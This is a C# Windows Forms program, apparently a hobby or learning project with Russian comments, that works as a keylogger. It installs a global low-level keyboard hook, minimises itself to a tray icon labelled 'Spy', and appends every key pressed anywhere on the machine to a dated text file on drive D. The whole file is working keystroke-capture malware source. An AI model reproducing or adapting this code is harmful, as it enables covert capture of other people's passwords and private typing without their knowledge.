using KeyLogger.Properties;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class MainForm : Form
    {
        // Иконка.
        private NotifyIcon notifyIcon = null;

        // Делегат.
        private delegate IntPtr LowLevelKeyboardProc(
            int nCode, IntPtr wParam, IntPtr lParam);

        // Подключение библиотеки.
        // Функция для установки хука.
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(
            int idHook,
            LowLevelKeyboardProc callback,
            IntPtr hinstance,
            uint threadId);

        // Функция для снятия пользовательского хука.
        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hinstance);

        // Функция для передачи сообщения для цепочки.
        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(
            IntPtr idHook,
            int nCode,
            int wParam,
            IntPtr lParam);

        // Функция для загрузки библиотек.
        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        // Номер глобального LowLevel-хука на клавиатуру.
        const int WH_KEYBOARD_LL = 13;
        // Сообщение нажатия на клавишу.
        const int WM_KEYDOWN = 0x100;

        // Создаем callback делегат.
        private LowLevelKeyboardProc _proc = hookProc;

        // Создаем hook, и присваеваем ему значение 0.
        private static IntPtr hhook = IntPtr.Zero;

        

        
        public MainForm()
        {
            InitializeComponent();

            this.Load += MainForm_Load;
            this.FormClosing += MainForm_FormClosing;
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnHook();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            FormSetting();

            SetHook();
        }

        private void FormSetting()
        {
            this.ShowInTaskbar = false;
            this.WindowState = FormWindowState.Minimized;

            notifyIcon = new NotifyIcon();
            notifyIcon.Icon = Resources.Spy;
            notifyIcon.Visible = true;

            notifyIcon.MouseDoubleClick += NotifyIcon_MouseDoubleClick;
        }

        private void NotifyIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.Close();
        }

        public void SetHook()
        {
            IntPtr hinstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(
                WH_KEYBOARD_LL,
                _proc,
                hinstance,
                0);
        }

        public static void UnHook()
        {
            UnhookWindowsHookEx(hhook);
        }


        private static IntPtr hookProc(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Обработка нажатия.
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string dt = $"{DateTime.Now.ToShortDateString()}";

                string fileName = $"D:\\logger_{dt}.txt";
                if (!File.Exists(fileName))
                {
                    using (FileStream fs = File.Create(fileName)) { };
                }

                using (StreamWriter sw = new StreamWriter(fileName, append: true))
                {
                    // Раскладка Великобритании.
                    if (vkCode.ToString() == "8")
                    {
                        sw.Write("[BACKSPACE]");
                    }
                    else if (vkCode.ToString() == "9")
                    {
                        sw.Write("[TAB]");
                    }
                    else if (vkCode.ToString() == "12")
                    {
                        sw.Write("[CLEAR]");
                    }
                    else if (vkCode.ToString() == "13")
                    {
                        sw.Write("[ENTER]");
                    }
                    else if (vkCode.ToString() == "16")
                    {
                        sw.Write("[SHIFT]");
                    }
                    else if (vkCode.ToString() == "17")
                    {
                        sw.Write("[CTRL]");
                    }
                    else if (vkCode.ToString() == "18")
                    {
                        sw.Write("[ALT]");
                    }
                    else if (vkCode.ToString() == "19")
                    {
                        sw.Write("[PAUSE]");
                    }
                    else if (vkCode.ToString() == "20")
                    {
                        sw.Write("[CAPS LOCK]");
                    }
                    else if (vkCode.ToString() == "27")
                    {
                        sw.Write("[ESC]");
                    }
                    else if (vkCode.ToString() == "32")
                    {
                        sw.Write("[SPACEBAR]");
                    }
                    else if (vkCode.ToString() == "33")
                    {
                        sw.Write("[PAGE UP]");
                    }
                    else if (vkCode.ToString() == "34")
                    {
                        sw.Write("[PAGE DOWN]");
                    }
                    else if (vkCode.ToString() == "35")
                    {
                        sw.Write("[END]");
                    }
                    else if (vkCode.ToString() == "36")
                    {
                        sw.Write("[HOME]");
                    }
                    // Arrow
                    else if (vkCode.ToString() == "37")
                    {
                        sw.Write("[LEFT ARROW]");
                    }
                    else if (vkCode.ToString() == "38")
                    {
                        sw.Write("[UP ARROW]");
                    }
                    else if (vkCode.ToString() == "39")
                    {
                        sw.Write("[RIGHT ARROW]");
                    }
                    else if (vkCode.ToString() == "40")
                    {
                        sw.Write("[DOWN ARROW]");
                    }
                    //
                    else if (vkCode.ToString() == "45")
                    {
                        sw.Write("[INS]");
                    }
                    else if (vkCode.ToString() == "46")
                    {
                        sw.Write("[DEL]");
                    }
                    // Numbers
                    else if (vkCode.ToString() == "48")
                    {
                        sw.Write("0");
                    }
                    else if (vkCode.ToString() == "49")
                    {
                        sw.Write("1");
                    }
                    else if (vkCode.ToString() == "50")
                    {
                        sw.Write("2");
                    }
                    else if (vkCode.ToString() == "51")
                    {
                        sw.Write("3");
                    }
                    else if (vkCode.ToString() == "52")
                    {
                        sw.Write("4");
                    }
                    else if (vkCode.ToString() == "53")
                    {
                        sw.Write("5");
                    }
                    else if (vkCode.ToString() == "54")
                    {
                        sw.Write("6");
                    }
                    else if (vkCode.ToString() == "55")
                    {
                        sw.Write("7");
                    }
                    else if (vkCode.ToString() == "56")
                    {
                        sw.Write("8");
                    }
                    else if (vkCode.ToString() == "57")
                    {
                        sw.Write("9");
                    }
                    // Letters
                    else if (vkCode.ToString() == "65")
                    {
                        sw.Write("a");
                    }
                    else if (vkCode.ToString() == "66")
                    {
                        sw.Write("b");
                    }
                    else if (vkCode.ToString() == "67")
                    {
                        sw.Write("c");
                    }
                    else if (vkCode.ToString() == "68")
                    {
                        sw.Write("d");
                    }
                    else if (vkCode.ToString() == "69")
                    {
                        sw.Write("e");
                    }
                    else if (vkCode.ToString() == "70")
                    {
                        sw.Write("f");
                    }
                    else if (vkCode.ToString() == "71")
                    {
                        sw.Write("g");
                    }
                    else if (vkCode.ToString() == "72")
                    {
                        sw.Write("h");
                    }
                    else if (vkCode.ToString() == "73")
                    {
                        sw.Write("i");
                    }
                    else if (vkCode.ToString() == "74")
                    {
                        sw.Write("j");
                    }
                    else if (vkCode.ToString() == "75")
                    {
                        sw.Write("k");
                    }
                    else if (vkCode.ToString() == "76")
                    {
                        sw.Write("l");
                    }
                    else if (vkCode.ToString() == "77")
                    {
                        sw.Write("m");
                    }
                    else if (vkCode.ToString() == "78")
                    {
                        sw.Write("n");
                    }
                    else if (vkCode.ToString() == "79")
                    {
                        sw.Write("o");
                    }
                    else if (vkCode.ToString() == "80")
                    {
                        sw.Write("p");
                    }
                    else if (vkCode.ToString() == "81")
                    {
                        sw.Write("q");
                    }
                    else if (vkCode.ToString() == "82")
                    {
                        sw.Write("r");
                    }
                    else if (vkCode.ToString() == "83")
                    {
                        sw.Write("s");
                    }
                    else if (vkCode.ToString() == "84")
                    {
                        sw.Write("t");
                    }
                    else if (vkCode.ToString() == "85")
                    {
                        sw.Write("u");
                    }
                    else if (vkCode.ToString() == "86")
                    {
                        sw.Write("v");
                    }
                    else if (vkCode.ToString() == "87")
                    {
                        sw.Write("w");
                    }
                    else if (vkCode.ToString() == "88")
                    {
                        sw.Write("x");
                    }
                    else if (vkCode.ToString() == "89")
                    {
                        sw.Write("y");
                    }
                    else if (vkCode.ToString() == "90")
                    {
                        sw.Write("z");
                    }
                    //
                    else if (vkCode.ToString() == "91" 
                        || vkCode.ToString() == "92")
                    {
                        sw.Write("[Windows key]");
                    }
                    else if (vkCode.ToString() == "96")
                    {
                        sw.Write("0");
                    }
                    else if (vkCode.ToString() == "97")
                    {
                        sw.Write("1");
                    }
                    else if (vkCode.ToString() == "98")
                    {
                        sw.Write("2");
                    }
                    else if (vkCode.ToString() == "99")
                    {
                        sw.Write("3");
                    }
                    else if (vkCode.ToString() == "100")
                    {
                        sw.Write("4");
                    }
                    else if (vkCode.ToString() == "101")
                    {
                        sw.Write("5");
                    }
                    else if (vkCode.ToString() == "102")
                    {
                        sw.Write("6");
                    }
                    else if (vkCode.ToString() == "103")
                    {
                        sw.Write("7");
                    }
                    else if (vkCode.ToString() == "104")
                    {
                        sw.Write("8");
                    }
                    else if (vkCode.ToString() == "105")
                    {
                        sw.Write("9");
                    }
                    //
                    else if (vkCode.ToString() == "106")
                    {
                        sw.Write("*");
                    }
                    else if (vkCode.ToString() == "107")
                    {
                        sw.Write("+");
                    }
                    else if (vkCode.ToString() == "109")
                    {
                        sw.Write("-");
                    }
                    else if (vkCode.ToString() == "110")
                    {
                        sw.Write(".");
                    }
                    else if (vkCode.ToString() == "111")
                    {
                        sw.Write("/");
                    }
                    //
                    else if (vkCode.ToString() == "144")
                    {
                        sw.Write("[NUM LOCK]");
                    }
                    else if (vkCode.ToString() == "145")
                    {
                        sw.Write("[SCROLL LOCK]");
                    }
                    // Shift
                    else if (vkCode.ToString() == "160"
                        || vkCode.ToString() == "161")
                    {
                        sw.Write("[SHIFT]");
                    }
                    // Control
                    else if (vkCode.ToString() == "162"
                        || vkCode.ToString() == "163")
                    {
                        sw.Write("[CTRL]");
                    }
                    sw.Close();
                }

                return (IntPtr)0;
            }
            else
            {
                return CallNextHookEx(hhook, nCode, (int)wParam, lParam);
            }
        }

    }
}
